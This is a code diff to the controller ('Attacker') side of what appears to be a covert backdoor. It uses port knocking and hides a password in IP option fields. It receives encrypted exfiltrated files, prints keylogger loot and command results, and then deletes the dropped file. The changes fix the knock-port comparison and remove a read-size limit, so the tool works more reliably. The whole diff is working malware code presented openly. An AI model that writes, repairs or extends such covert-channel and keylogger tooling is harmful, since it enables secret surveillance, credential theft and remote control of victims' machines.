@@ -17,7 +17,6 @@ password stored in ip_option field
 type of response stored in tcp reserved field
 result stored in tcp payload
 """
-BUFFER_SIZE = 1024
 class Attacker(object):
 
     def __init__(self, lhost, lport, fport, rhost, rport, proto, password, kList, ttl):
@@ -76,11 +75,11 @@ class Attacker(object):
     def knockReceive(self, packet):
         if packet.haslayer(UDP):
             port = packet[UDP].dport
-            if port == self.knockList[0] and self.state == 0:
+            if port == int(self.knockList[0]) and self.state == 0:
                 self.state = 1
-            elif port == self.knockList[1] and self.state == 1:
+            elif port == int(self.knockList[1]) and self.state == 1:
                 self.state = 2
-            elif port == self.knockList[2] and self.state == 2:
+            elif port == int(self.knockList[2]) and self.state == 2:
                 self.state = 3
                 print("Knocking successfully...Openning port for receiving")
                 self.acceptRequest()
@@ -96,7 +95,6 @@ class Attacker(object):
         sock.bind((self.localIP, port))
 
         sock.listen(1)
-        print("Ready to receive on port %d..." % port)
         conn, addr = sock.accept()
         print("Receive connection from {}".format(addr))
 
@@ -114,12 +112,12 @@ class Attacker(object):
         conn.close()
         sucess, filename = encryption.decryptFile(dummyFile)
         if sucess:
-            if filename == ".loot.txt":
+            if filename == "loot.txt":
                 with open(filename, "rb") as myfile:
-                    print("Keylogg: {}".format(myfile.read(BUFFER_SIZE)))
+                    print("Keylogg: {}".format(myfile.read()))
             elif filename == "result.txt":
                 with open(filename, "rb") as myfile:
-                    print("Result: {}".format(myfile.read(BUFFER_SIZE)))
+                    print("Result: {}".format(myfile.read()))
         os.remove(dummyFile)
         print("Done receiving!")
 
